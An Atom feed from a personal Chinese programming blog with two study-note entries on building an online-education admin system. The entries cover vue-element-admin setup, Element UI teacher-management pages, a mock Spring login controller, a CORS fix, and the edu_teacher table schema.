<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://crlrlc.github.io/</id>
    <title>Gridea</title>
    <updated>2023-06-20T14:05:41.091Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://crlrlc.github.io/"/>
    <link rel="self" href="https://crlrlc.github.io/atom.xml"/>
    <subtitle>温故而知新</subtitle>
    <logo>https://crlrlc.github.io/images/avatar.png</logo>
    <icon>https://crlrlc.github.io/favicon.ico</icon>
    <rights>All rights reserved 2023, Gridea</rights>
    <entry>
        <title type="html"><![CDATA[Day204.前端页面环境搭建]]></title>
        <id>https://crlrlc.github.io/post/day204qian-duan-ye-mian-huan-jing-da-jian/</id>
        <link href="https://crlrlc.github.io/post/day204qian-duan-ye-mian-huan-jing-da-jian/">
        </link>
        <updated>2023-04-05T13:16:57.000Z</updated>
        <content type="html"><![CDATA[<h1 id="搭建项目前端页面环境">搭建项目前端页面环境</h1>
<h2 id="一-vue-element-admin">一、vue-element-admin</h2>
<h3 id="1-简介">1、简介</h3>
<p>而vue-element-admin是基于element-ui 的一套后台管理系统集成方案。</p>
<p>功能：https://panjiachen.github.io/vue-element-admin-site/zh/guide/#%E5%8A%9F%E8%83%BD</p>
<p>GitHub地址：https://github.com/PanJiaChen/vue-element-admin</p>
<p>项目在线预览：https://panjiachen.gitee.io/vue-element-admin/#/login?redirect=%2Fdashboard</p>
<h3 id="2-安装">2、安装</h3>
<pre><code class="language-shell"># 解压压缩包
# 进入目录
cd vue-element-admin-master

# 安装依赖，安装后会出现node_modules的文件夹，里面存放依赖
npm install

# 启动。执行后，浏览器自动弹出并访问http://localhost:9527/
npm run dev
</code></pre>
<p>遇到的问题：</p>
<p>这里我的npm install一直报错，所有我直接去找老师的依赖直接导入 不下载了，然后通过npm run dev发现也报错，说无法编译，不支持window64位的Node.js 10.x，我上网找了答案如下：</p>
<p>首先在项目目录下依次安装以下文件：</p>
<p>npm install node-sass</p>
<p>npm i node-sass -D</p>
<p>如果继续报错，会提醒安装element-ui就可以运行项目了,我们继续在项目目录下安装它就好了：</p>
<p>npm install --save element-ui</p>
<p>以上操作后项目可以通过npm run dev 运行起来<br>
<img src="https://crlrlc.github.io//post-images/1687267130500.png" alt="" loading="lazy"></p>
<p>此步已经整完了后台系统前端项目的环境搭建。</p>
<h2 id="二-项目的创建和基本配置">二、项目的创建和基本配置</h2>
<h3 id="1-创建项目">1、创建项目</h3>
<p>将vue-admin-template-master重命名为guli-admin</p>
<h3 id="2-修改项目信息">2、修改项目信息</h3>
<p>package.json</p>
<pre><code class="language-json">{
    &quot;name&quot;: &quot;guli-admin&quot;,
    ......
    &quot;description&quot;: &quot;谷粒学院后台管理系统&quot;,
    &quot;author&quot;: &quot;achang &lt;995931576@qq.com&gt;&quot;,
    ......
}
</code></pre>
<h3 id="3-如果需要修改端口号">3、如果需要修改端口号</h3>
<p>config/index.js 中修改</p>
<pre><code>port: 9528
</code></pre>
<h3 id="4-不使用eslint语法检查">4、不使用Eslint语法检查</h3>
<figure data-type="image" tabindex="1"><img src="https://crlrlc.github.io//post-images/1687267247546.png" alt="" loading="lazy"></figure>
<h3 id="5-修改后端接口访问地址">5、修改后端接口访问地址</h3>
<figure data-type="image" tabindex="2"><img src="https://crlrlc.github.io//post-images/1687267287960.png" alt="" loading="lazy"></figure>
<h3 id="6-项目的目录结构">6、项目的目录结构</h3>
<pre><code>.
├── build // 构建脚本
├── config // 全局配置
├── node_modules // 项目依赖模块
├── src //项目源代码
├── static // 静态资源
└── package.jspon // 项目信息和依赖配置
</code></pre>
<pre><code>src
├── api // 各种接口
├── assets // 图片等资源
├── components // 各种公共组件，非公共组件在各自view下维护
├── icons //svg icon
├── router // 路由表
├── store // 存储
├── styles // 各种样式
├── utils // 公共工具，非公共工具，在各自view下维护
├── views // 各种layout
├── App.vue //***项目顶层组件***
├── main.js //***项目入口文件***
└── permission.js //认证入口
</code></pre>
<figure data-type="image" tabindex="3"><img src="https://crlrlc.github.io//post-images/1687267364597.png" alt="" loading="lazy"></figure>
<h3 id="7-运行项目">7、运行项目</h3>
<pre><code class="language-shell">npm run dev
</code></pre>
<h2 id="三-登录页修改">三、登录页修改</h2>
<p>src/views/login/index.vue（登录组件）</p>
<pre><code class="language-html">&lt;h3 class=&quot;title&quot;&gt;阿昌之谷粒学院后台管理系统&lt;/h3&gt;
</code></pre>
<figure data-type="image" tabindex="4"><img src="https://crlrlc.github.io//post-images/1687267535612.png" alt="" loading="lazy"></figure>
<pre><code class="language-html">&lt;el-button :loading=&quot;loading&quot; type=&quot;primary&quot; style=&quot;width:100%;&quot;
@click.native.prevent=&quot;handleLogin&quot;&gt;
登录
&lt;/el-button&gt;
</code></pre>
<figure data-type="image" tabindex="5"><img src="https://crlrlc.github.io//post-images/1687267621390.png" alt="" loading="lazy"></figure>
<h2 id="四-页面零星修改">四、页面零星修改</h2>
<h3 id="1-国际化设置">1、国际化设置</h3>
<p>打开 src/main.js（项目的js入口），第7行，修改语言为 zh-CN，使用中文语言环境，例如：日期时间组件</p>
<figure data-type="image" tabindex="6"><img src="https://crlrlc.github.io//post-images/1687267701692.png" alt="" loading="lazy"></figure>
<h3 id="2-导航栏文字">2、导航栏文字</h3>
<p>src/views/layout/components（当前项目的布局组件）<br>
src/views/layout/components/Navbar.vue<br>
13行</p>
<pre><code class="language-html">&lt;el-dropdown-item&gt;
首页
&lt;/el-dropdown-item&gt;
</code></pre>
<p>17 行</p>
<pre><code class="language-html">&lt;span style=&quot;display:block;&quot; @click=&quot;logout&quot;&gt;登出&lt;/span&gt;
</code></pre>
<h1 id="后台系统登录功能改造">后台系统登录功能改造</h1>
<h2 id="一-模拟登录">一、模拟登录</h2>
<figure data-type="image" tabindex="7"><img src="https://crlrlc.github.io//post-images/1687267895837.png" alt="" loading="lazy"></figure>
<p>注意下面的https和http，我们这里使用http，不是https；<br>
https是需要相关部门认证才可以使用</p>
<figure data-type="image" tabindex="8"><img src="https://crlrlc.github.io//post-images/1687267938221.png" alt="" loading="lazy"></figure>
<p>后端根据这个返回下面的(1)、(2)<br>
<img src="https://crlrlc.github.io//post-images/1687267979499.png" alt="" loading="lazy"><br>
<img src="https://crlrlc.github.io//post-images/1687268003302.png" alt="" loading="lazy"></p>
<p>【开发接口】创建controller/EduLoginController</p>
<pre><code class="language-java">@RestController
@RequestMapping(&quot;/eduService/user&quot;)
public class EduLoginController {

    //login
    @PostMapping(&quot;/login&quot;)
    public R login(){
        return R.ok().data(&quot;token&quot;,&quot;admin&quot;);
    }
    
    //info
    @GetMapping(&quot;/info&quot;)
    public R info(){
        return R.ok().data(&quot;roles&quot;,&quot;admin&quot;).data(&quot;name&quot;,&quot;阿昌&quot;).data(&quot;avatar&quot;,&quot;http://www.weixintouxiang.cn/weixin/20140607090832328.gif&quot;);
    }
    
}
</code></pre>
<p>修改前端地址，api/login.js修改为上面的接口路径<br>
<img src="https://crlrlc.github.io//post-images/1687268065008.png" alt="" loading="lazy"></p>
<p>重启前端服务器，开启后端服务器，测试<br>
<img src="https://crlrlc.github.io//post-images/1687268096916.png" alt="" loading="lazy"></p>
<p>出现了【跨域问题】<br>
<img src="https://crlrlc.github.io//post-images/1687268141777.png" alt="" loading="lazy"></p>
<p>什么是跨域问题：</p>
<p>通过一个地址去访问另外一个地址，这个过程中如果有三个地方任何不一样<br>
<img src="https://crlrlc.github.io//post-images/1687268177374.png" alt="" loading="lazy"></p>
<p>哪三个地方：访问协议、ip地址、端口号</p>
<p>跨域解决方式：<br>
<img src="https://crlrlc.github.io//post-images/1687268223496.png" alt="" loading="lazy"></p>
<p>后端的EduLoginController类上加上@CrossOrigin</p>
<pre><code class="language-java">@RestController
@RequestMapping(&quot;/eduService/user&quot;)
@CrossOrigin //解决跨域问题
public class EduLoginController {
	...
}
</code></pre>
<p>之后再次访问即可</p>
<h2 id="二-前端框架使用过程">二、前端框架使用过程</h2>
<figure data-type="image" tabindex="9"><img src="https://crlrlc.github.io//post-images/1687268463541.jpg" alt="" loading="lazy"></figure>
<h2 id="三-讲师列表的前端实现">三、讲师列表的前端实现</h2>
<h3 id="1-添加路由">1、添加路由</h3>
<p>在src/router/index.js中，复制一份example做代码修改</p>
<pre><code class="language-js">  {
    //地址输入
    path: '/teacher',
    component: Layout,
    //redirect：重定向地址
    redirect: '/teacher/table',
    name: '讲师管理',
    //title:显示标签 ， icon：显示图标
    meta: { title: '讲师管理', icon: 'example' },
    children: [
      {
        path: 'table',
        name: '讲师列表',
        component: () =&gt; import('@/views/table/index'),
        meta: { title: '讲师列表', icon: 'table' }
      },
      {
        path: 'save',
        name: '添加讲师',
        component: () =&gt; import('@/views/tree/index'),
        meta: { title: '添加讲师', icon: 'tree' }
      }
    ]
  },
</code></pre>
<figure data-type="image" tabindex="10"><img src="https://crlrlc.github.io//post-images/1687268559672.png" alt="" loading="lazy"></figure>
<h3 id="2-创建路由对应的组件">2、创建路由对应的组件</h3>
<p>创建src/views/edu/teacher文件夹存放组件，并创建list.vue和save.vue</p>
<p>将对应的路由设置为对应的组件页面<br>
<img src="https://crlrlc.github.io//post-images/1687268598240.png" alt="" loading="lazy"></p>
<h3 id="3-定义访问的接口地址">3、定义访问的接口地址</h3>
<p>在src/api文件创建teacher/teacher.js定义访问的接口地址</p>
<pre><code class="language-js">import request from '@/utils/request' //引入已经封装好的axios 和 拦截器

export default{
    //1、讲师列表（多条件分页查询）
    //page：当前页，limit：每页记录数，teacherQuery：条件对象
    getTeacherListPage(page,limit,teacherQuery){
        return request({
            // url: '/eduservice/edu-teacher/pageTeacherCondition/'+page+'/'+limit,
            url: `/eduservice/edu-teacher/pageTeacherCondition/${page}/${limit}`,
            method: 'post',
            //teacherQuery条件对象，如果后端使用RequestBody获取数据
            //data表示把对象转换成json对象进行传递到接口里
            data: teacherQuery
          })
    }
}
</code></pre>
<h3 id="4-组件页面调用定义接口方法">4、组件页面调用定义接口方法</h3>
<p>在讲师列表页面list.vue页面调用定义的接口方法，得到接口返回数据</p>
<pre><code class="language-html">.&lt;template&gt;
  &lt;div class=&quot;app-container&quot;&gt;讲师列表&lt;/div&gt;
&lt;/template&gt;

&lt;script&gt;
//引入要调用的方法，teacher.js文件
import teacher from &quot;@/api/teacher/teacher.js&quot;;

export default {
  //写核心代码位置
  data() {
    //1、定义变量和初始值
    return {
      list: null, //查询之后给接口返回的数据装的集合
      page: 1, //当前页
      limit: 10, //每页显示记录数
      teacherQuery: {}, //条件封装对象
      total: 0, //总记录数
    };
  },
  created() {
    //页面渲染之前执行，调用method定义的方法
    //调用
    this.getList();
  },
  methods: {
    //调用具体的方法，调用teacher.js定义的方法
    //讲师列表的方法
    getList() {
      teacher
        .getTeacherListPage(this.page, this.limit, this.teacherQuery)
        .then((resp) =&gt; {
          //resp接口返回的数据
          // console.log(resp);
          this.list = resp.data.rows;
          console.log(this.list);
          this.total = resp.data.total;
          console.log(this.total);
        }) //请求成功
        .catch((err) =&gt; {
          console.log(err);
        }); //请求失败
    },
  },
};
&lt;/script&gt;

&lt;style&gt;&lt;/style&gt;
</code></pre>
<h3 id="5-测试">5、测试</h3>
<figure data-type="image" tabindex="11"><img src="https://crlrlc.github.io//post-images/1687268711522.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="12"><img src="https://crlrlc.github.io//post-images/1687268737577.png" alt="" loading="lazy"></figure>
<h3 id="6-使用element-ui快速构建页面">6、使用element-ui快速构建页面</h3>
<pre><code class="language-html">.&lt;template&gt;
  &lt;div&gt;
    &lt;el-table
      :data=&quot;list&quot;
      style=&quot;width: 100%&quot;
      border
      fit
      highlight-current-row
      element-loading-text=&quot;数据加载中&quot;
      v-loading=&quot;listLoading&quot;
    &gt;
      &lt;el-table-column prop=&quot;date&quot; label=&quot;序号&quot; width=&quot;70&quot; align=&quot;center&quot;&gt;
        &lt;template slot-scope=&quot;scope&quot;&gt;
          {{ (page - 1) * limit + scope.$index + 1 }}
        &lt;/template&gt;
      &lt;/el-table-column&gt;
      &lt;el-table-column prop=&quot;name&quot; label=&quot;名称&quot; width=&quot;80&quot;&gt; &lt;/el-table-column&gt;
      &lt;el-table-column label=&quot;头衔&quot; width=&quot;80&quot;&gt;
        &lt;template slot-scope=&quot;scope&quot;&gt;
          {{ scope.row.level === 1 ? &quot;高级讲师&quot; : &quot;首席讲师&quot; }}
        &lt;/template&gt;
      &lt;/el-table-column&gt;
      &lt;el-table-column prop=&quot;intro&quot; label=&quot;资历&quot; /&gt;
      &lt;el-table-column prop=&quot;gmtCreate&quot; label=&quot;添加时间&quot; width=&quot;160&quot; /&gt;
      &lt;el-table-column prop=&quot;sort&quot; label=&quot;排序&quot; width=&quot;60&quot; /&gt;
      &lt;el-table-column label=&quot;操作&quot; width=&quot;200&quot; align=&quot;center&quot;&gt;
        &lt;template slot-scope=&quot;scope&quot;&gt;
          &lt;router-link :to=&quot;'/edu/teacher/edit/' + scope.row.id&quot;&gt;
            &lt;el-button type=&quot;primary&quot; size=&quot;mini&quot; icon=&quot;el-icon-edit&quot;
              &gt;修改&lt;/el-button
            &gt;
          &lt;/router-link&gt;
          &lt;el-button
            type=&quot;danger&quot;
            size=&quot;mini&quot;
            icon=&quot;el-icon-delete&quot;
            @click=&quot;removeDataById(scope.row.id)&quot;
            &gt;删除&lt;/el-button
          &gt;
        &lt;/template&gt;
      &lt;/el-table-column&gt;
    &lt;/el-table&gt;
  &lt;/div&gt;
&lt;/template&gt;
</code></pre>
<h3 id="7-分页功能实现">7、分页功能实现</h3>
<p>getList方法的修改<br>
<img src="https://crlrlc.github.io//post-images/1687268799530.png" alt="" loading="lazy"></p>
<pre><code class="language-html">&lt;!--分页组件--&gt;
&lt;el-pagination
               background
               layout=&quot;prev, pager, next,total,jumper&quot;
               :total=&quot;total&quot;
               :page-size=&quot;limit&quot;
               style=&quot;padding: 30px 0; text-align: center&quot;
               :current-page=&quot;page&quot;
               @current-change=&quot;getList&quot;
               &gt;
&lt;/el-pagination&gt;
</code></pre>
<figure data-type="image" tabindex="13"><img src="https://crlrlc.github.io//post-images/1687268836326.png" alt="" loading="lazy"></figure>
<h3 id="8-讲师条件查询">8、讲师条件查询</h3>
<pre><code class="language-html">    &lt;!--多条件查询表单--&gt;
    &lt;el-form
      :inline=&quot;true&quot;
      class=&quot;demo-form-inline&quot;
      style=&quot;margin-left: 20px; margin-top: 12px;&quot;
    &gt;
      &lt;el-form-item label=&quot;名称&quot;&gt;
        &lt;el-input
          v-model=&quot;teacherQuery.name&quot;
          placeholder=&quot;请输入名称&quot;
        &gt;&lt;/el-input&gt;
      &lt;/el-form-item&gt;
      &lt;el-form-item label=&quot;级别&quot;&gt;
        &lt;el-select v-model=&quot;teacherQuery.level&quot; placeholder=&quot;讲师头衔&quot;&gt;
          &lt;el-option label=&quot;高级讲师&quot; :value=&quot;1&quot;&gt;&lt;/el-option&gt;
          &lt;el-option label=&quot;特级讲师&quot; :value=&quot;2&quot;&gt;&lt;/el-option&gt;
        &lt;/el-select&gt;
      &lt;/el-form-item&gt;
      &lt;el-form-item label=&quot;添加时间&quot;&gt;
        &lt;el-time-picker
          placeholder=&quot;选择开始时间&quot;
          v-model=&quot;teacherQuery.begin&quot;
          value-format=&quot;yyyy-MM-dd HH:mm:ss&quot;
          default-time=&quot;00:00:00&quot;
          type=&quot;datetime&quot;
        &gt;&lt;/el-time-picker&gt;
      &lt;/el-form-item&gt;
      &lt;el-form-item&gt;
        &lt;el-time-picker
          placeholder=&quot;选择截止时间&quot;
          v-model=&quot;teacherQuery.end&quot;
          value-format=&quot;yyyy-MM-dd HH:mm:ss&quot;
          default-time=&quot;00:00:00&quot;
          type=&quot;datetime&quot;
        &gt;&lt;/el-time-picker&gt;
      &lt;/el-form-item&gt;
      &lt;el-form-item&gt;
        &lt;el-button type=&quot;primary&quot; icon=&quot;el-icon-search&quot; @click=&quot;getList()&quot;
          &gt;查询&lt;/el-button
        &gt;
        &lt;el-button type=&quot;default&quot; @click=&quot;resetData()&quot;&gt;清空&lt;/el-button&gt;
      &lt;/el-form-item&gt;
    &lt;/el-form&gt;
</code></pre>
<p>方法调用：</p>
<pre><code class="language-js">  data() {
    return {
	...
      teacherQuery: {}, //条件封装对象
    };
  },
  methods: {
    getList(page = 1) {
      this.page = page;
      teacher
        .getTeacherListPage(this.page, this.limit, this.teacherQuery)
        .then((resp) =&gt; {
          // console.log(resp);
          this.list = resp.data.rows;
          console.log(this.list);
          this.total = resp.data.total;
          console.log(this.total);
        }) 
        .catch((err) =&gt; {
          console.log(err);
        }); 
    },
    //清空方法
    resetData() {
      //表单输入项数据清空
      this.teacherQuery = {};
      //查询所有讲师数据
      this.getList();
    },
  },
</code></pre>
<figure data-type="image" tabindex="14"><img src="https://crlrlc.github.io//post-images/1687268967990.png" alt="" loading="lazy"></figure>
<h3 id="9-讲师删除">9、讲师删除</h3>
<p>1）定义api：</p>
<p>src/api/teacher/teacher.js</p>
<pre><code class="language-js">export default{
	...
    //根据id删除讲师
    removeById(id){
        return request({
            url: `/eduservice/edu-teacher/deleteTeacherById/${id}`,
            method: 'delete',
        })
    }
}
</code></pre>
<p>2）定义methods：</p>
<p>src/views/edu/teacher/list.vue</p>
<p>使用MessageBox 弹框组件<br>
<img src="https://crlrlc.github.io//post-images/1687269022700.png" alt="" loading="lazy"></p>
<pre><code class="language-js">removeById(id) {
    this.$confirm(&quot;此操作将永久删除该讲师记录, 是否继续?&quot;, &quot;提示&quot;, {
        confirmButtonText: &quot;确定&quot;,
        cancelButtonText: &quot;取消&quot;,
        type: &quot;warning&quot;,
    }).then(() =&gt; {
        //点击确定，执行then方法
        teacher.removeById(id)
            .then((resp) =&gt; {//删除成功
            //提示信息
            this.$message({
                type: &quot;success&quot;,
                message: &quot;删除成功!&quot;,
            });
            //刷新页面
            this.getList();
        });
    });
}
</code></pre>
<p>测试<br>
<img src="https://crlrlc.github.io//post-images/1687269086919.png" alt="" loading="lazy"><br>
<img src="https://crlrlc.github.io//post-images/1687269127445.png" alt="" loading="lazy"></p>
<h3 id="10-讲师添加">10、讲师添加</h3>
<p>1）、定义api方法：</p>
<p>src/api/teacher/teacher.js</p>
<pre><code class="language-js">//新增讲师
saveTeacher(teacher){
    return request({
        url: `/eduservice/edu-teacher/save`,
        method: `post`,
        data: teacher
    })
}
</code></pre>
<p>2、初始化组件：</p>
<p>src/views/edu/teacher/save.vue</p>
<pre><code class="language-html">.&lt;template&gt;
    &lt;div class=&quot;app-container&quot;&gt;
        &lt;el-form label-width=&quot;120px&quot;&gt;
            &lt;el-form-item label=&quot;讲师名称&quot;&gt;
                &lt;el-input v-model=&quot;teacher.name&quot; /&gt;
            &lt;/el-form-item&gt;
            &lt;el-form-item label=&quot;讲师排序&quot;&gt;
                &lt;el-input-number
                                 v-model=&quot;teacher.sort&quot;
                                 controls-position=&quot;right&quot;
                                 min=&quot;0&quot;
                                 /&gt;
            &lt;/el-form-item&gt;
            &lt;el-form-item label=&quot;讲师头衔&quot;&gt;
                &lt;el-select v-model=&quot;teacher.level&quot; clearable placeholder=&quot;选择讲师头衔&quot;&gt;
                    &lt;!--
数据类型一定要和取出的json中的一致，否则没法回填
因此，这里value使用动态绑定的值，保证其数据类型是number
--&gt;
                    &lt;el-option :value=&quot;1&quot; label=&quot;高级讲师&quot; /&gt;
                    &lt;el-option :value=&quot;2&quot; label=&quot;首席讲师&quot; /&gt;
                &lt;/el-select&gt;
            &lt;/el-form-item&gt;
            &lt;el-form-item label=&quot;讲师资历&quot;&gt;
                &lt;el-input v-model=&quot;teacher.career&quot; /&gt;
            &lt;/el-form-item&gt;
            &lt;el-form-item label=&quot;讲师简介&quot;&gt;
                &lt;el-input v-model=&quot;teacher.intro&quot; :rows=&quot;10&quot; type=&quot;textarea&quot; /&gt;
            &lt;/el-form-item&gt;
            &lt;!-- 讲师头像：TODO --&gt;
            &lt;el-form-item&gt;
                &lt;el-button
                           :disabled=&quot;saveBtnDisabled&quot;
                           type=&quot;primary&quot;
                           @click=&quot;saveOrUpdate&quot;
                           &gt;保存&lt;/el-button
                    &gt;
            &lt;/el-form-item&gt;
        &lt;/el-form&gt;
    &lt;/div&gt;
&lt;/template&gt;
</code></pre>
<pre><code class="language-js">&lt;script&gt;
    //引入对应的新增api方法
    import teacherApi from &quot;@/api/teacher/teacher.js&quot;;

export default {
    data() {
        return {
            teacher: {
                name: &quot;&quot;,
                sort: 0,
                level: 1,
                career: &quot;&quot;,
                intro: &quot;&quot;,
                avatar: &quot;&quot;,
            },
            saveBtnDisabled: false, // 保存按钮是否禁用,
        };
    },
    methods: {
        saveOrUpdate() {
            this.saveBtnDisabled = true;
            this.saveData();
        },
        // 保存
        saveData() {
            teacherApi.saveTeacher(this.teacher).then((resp) =&gt; {//添加成功
                //提示信息
                this.$message({
                    message: &quot;添加讲师记录成功&quot;,
                    type: &quot;success&quot;,
                });
                //回到讲师列表 路由跳转
                this.$router.push({path: '/teacher/table'})
            });
        },
    },
};
&lt;/script&gt;
</code></pre>
<p>后端按创建时间排序<br>
eduservice/service/impl/EduTeacherServiceImpl</p>
<pre><code class="language-java">//排序
wrapper.orderByDesc(&quot;gmt_create&quot;);
</code></pre>
<p>测试<br>
<img src="https://crlrlc.github.io//post-images/1687269245895.png" alt="" loading="lazy"><br>
<img src="https://crlrlc.github.io//post-images/1687269269256.png" alt="" loading="lazy"></p>
<h3 id="11-讲师信息回显">11、讲师信息回显</h3>
<p>添加一个隐藏路由：</p>
<p>src/router/index.js，/teacher路由的子路由没让他去save.vue添加讲师组件</p>
<pre><code class="language-js">{
    path: 'edit/:id',
    name: 'EduTeacherEdit',
    component: () =&gt; import('@/views/edu/teacher/save.vue'),
    meta: { title: '编辑讲师', noCache: true },
	hidden: true
}
</code></pre>
<figure data-type="image" tabindex="15"><img src="https://crlrlc.github.io//post-images/1687269320268.png" alt="" loading="lazy"></figure>
<p>通过router-link 的:to去’/teacher/edit/【:id携带id】'也就是上面这个路由，然后路由转换到save.vue组件上</p>
<figure data-type="image" tabindex="16"><img src="https://crlrlc.github.io//post-images/1687269370191.png" alt="" loading="lazy"></figure>
<p>在表单页面实现数据回显：</p>
<p>定义根据id查询讲师信息的api方法</p>
<pre><code class="language-js">//根据id查询讲师
updateById(id){
    return request({
        url: `/eduservice/edu-teacher/getById/${id}`,
        method: `get`,
    })
}
</code></pre>
<p>src/edu/teacher/save.vue</p>
<pre><code class="language-js">//根据id查询，数据回显
getInfoById(id){
    teacherApi.updateById(id)
        .then(resp =&gt;{
        this.teacher = resp.data.item
    })
}
</code></pre>
<p>src/edu/teacher/save.vue 中created()数据渲染前进行判断请求中是否有id值</p>
<pre><code class="language-js">created() {//在页面渲染之前
    //判断路径中是否有id值
    if(this.$route.params &amp;&amp; this.$route.params.id){
        //从路径中获取id值
        const id = this.$route.params.id
        //调用根据id查询的方法
        this.getInfoById(id)
    }
}
</code></pre>
<figure data-type="image" tabindex="17"><img src="https://crlrlc.github.io//post-images/1687269462655.png" alt="" loading="lazy"></figure>
<p>数据回显<br>
<img src="https://crlrlc.github.io//post-images/1687269499093.png" alt="" loading="lazy"></p>
<h3 id="12-讲师修改">12、讲师修改</h3>
<p>guli-admin\src\api\teacher\teacher.js，定义api讲师修改方法</p>
<pre><code class="language-js">//修改讲师信息
updateTeacherInfo(teacher){
    return request({
        url: `/eduservice/edu-teacher/updateById`,
        method: `post`,
        data: teacher
    })
}
</code></pre>
<p>guli-admin\src\views\edu\teacher\save.vue，修改方法</p>
<pre><code class="language-js//修改讲师的方法">updateTeacher() {
    teacherApi.updateTeacherInfo(this.teacher).then((resp) =&gt; {
        //提示信息
        this.$message({
            message: &quot;修改讲师记录成功&quot;,
            type: &quot;success&quot;,
        });
        //回到讲师列表 路由跳转
        this.$router.push({ path: &quot;/teacher/table&quot; });
    });
}
</code></pre>
<p>将修改和新增方法合一，进行判断</p>
<pre><code class="language-js">saveOrUpdate() {
    //判断修改还是新增操作
    //根据teacher对象是否有id值来判断
    if (!this.teacher.id) {
        //没有id值，做【新增操作】
        this.saveBtnDisabled = true;
        this.saveData();
    }else{
        //有id值，做【修改操作】
        this.updateTeacher()
    }
}
</code></pre>
<p>遇到的问题：</p>
<p>一直报跨域问题，检查发现后端EduTeacherController的@PostMapping()中的地址后面多加了/，一直报错跨域问题<br>
<img src="https://crlrlc.github.io//post-images/1687269594610.png" alt="" loading="lazy"></p>
<h3 id="13-存在bug问题">13、存在BUG问题</h3>
<figure data-type="image" tabindex="18"><img src="https://crlrlc.github.io//post-images/1687269645273.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="19"><img src="https://crlrlc.github.io//post-images/1687269669934.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="20"><img src="https://crlrlc.github.io//post-images/1687269692251.png" alt="" loading="lazy"></figure>
<p>解决方法<br>
通过使用监听器监听</p>
<p>将原本created()里面的发按法封装到init()中，在created()中调用，并通过监听器监听路由变化就执行init()判断路径是否有id值，有就获取id值，没有就清空数据；</p>
<p>$route(to, from)固定写法，意思为监听路由变化</p>
<pre><code class="language-js">...
init() {
    //判断路径中是否有id值
    if (this.$route.params &amp;&amp; this.$route.params.id) {
        //从路径中获取id值
        const id = this.$route.params.id;
        //调用根据id查询的方法
        this.getInfoById(id);
    }else{
        this.teacher = {};
    }
},
},
    created() {
        //在页面渲染之前
        this.init()
    },
        watch: {
            $route(to, from) {
                //路由变化方式，当路由发送变化，方法就执行
                console.log(&quot;watch $route&quot;);
                this.init()
            },
        }
</code></pre>
<figure data-type="image" tabindex="21"><img src="https://crlrlc.github.io//post-images/1687269731286.png" alt="" loading="lazy"></figure>
<p>至此，讲师管理模块的前端增删改查功能完成</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Day201.项目起步]]></title>
        <id>https://crlrlc.github.io/post/day201xiang-mu-qi-bu-mybatisplus-gu-li-xue-yuan/</id>
        <link href="https://crlrlc.github.io/post/day201xiang-mu-qi-bu-mybatisplus-gu-li-xue-yuan/">
        </link>
        <updated>2023-04-02T07:17:58.000Z</updated>
        <content type="html"><![CDATA[<h1 id="在线教育项目">在线教育项目</h1>
<h2 id="一-起步">一、起步</h2>
<h3 id="1-项目采用的商业模式">1、项目采用的商业模式</h3>
<p>B2C模式（Business To Customer 会员模式）：<em>此项目采用B2C</em><br>
<img src="https://crlrlc.github.io//post-images/1687246390829.png" alt="" loading="lazy"></p>
<h3 id="2-项目采用的功能模块">2、项目采用的功能模块</h3>
<figure data-type="image" tabindex="1"><img src="https://crlrlc.github.io//post-images/1687246501306.jpg" alt="" loading="lazy"></figure>
<h3 id="3-项目中采用的技术">3、项目中采用的技术</h3>
<figure data-type="image" tabindex="2"><img src="https://crlrlc.github.io//post-images/1687246576838.jpg" alt="" loading="lazy"></figure>
<h2 id="二-在线教育项目简介">二、在线教育项目简介</h2>
<h3 id="1-功能简介">1、功能简介</h3>
<p>在线教育项目，是一个B2C模式的职业技能在线教育系统，分为前台用户系统和后台运营平台。</p>
<h3 id="2-系统模块">2、系统模块</h3>
<figure data-type="image" tabindex="3"><img src="https://crlrlc.github.io//post-images/1687246777750.png" alt="" loading="lazy"></figure>
<h2 id="三-系统架构">三、系统架构</h2>
<figure data-type="image" tabindex="4"><img src="https://crlrlc.github.io//post-images/1687247176422.png" alt="" loading="lazy"></figure>
<h2 id="四-前后端分离概念">四、前后端分离概念</h2>
<figure data-type="image" tabindex="5"><img src="https://crlrlc.github.io//post-images/1687250827938.jpg" alt="" loading="lazy"></figure>
<h1 id="开发讲师管理模块后端">开发讲师管理模块后端</h1>
<h2 id="一-数据库设计">一、数据库设计</h2>
<h3 id="数据库">数据库</h3>
<p>guli</p>
<h3 id="数据表">数据表</h3>
<pre><code class="language-sql">CREATE TABLE `edu_teacher` (
  `id` char(19) NOT NULL COMMENT '讲师ID',
  `name` varchar(20) NOT NULL COMMENT '讲师姓名',
  `intro` varchar(500) NOT NULL DEFAULT '' COMMENT '讲师简介',
  `career` varchar(500) DEFAULT NULL COMMENT '讲师资历,一句话说明讲师',
  `level` int(10) unsigned NOT NULL COMMENT '头衔 1高级讲师 2首席讲师',
  `avatar` varchar(255) DEFAULT NULL COMMENT '讲师头像',
  `sort` int(10) unsigned NOT NULL DEFAULT '0' COMMENT '排序',
  `is_deleted` tinyint(1) unsigned NOT NULL DEFAULT '0' COMMENT '逻辑删除 1（true）已删除， 0（false）未删除',
  `gmt_create` datetime NOT NULL COMMENT '创建时间',
  `gmt_modified` datetime NOT NULL COMMENT '更新时间',
  PRIMARY KEY (`id`),
  UNIQUE KEY `uk_name` (`name`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COMMENT='讲师';

</code></pre>
<h3 id="插入数据">插入数据</h3>
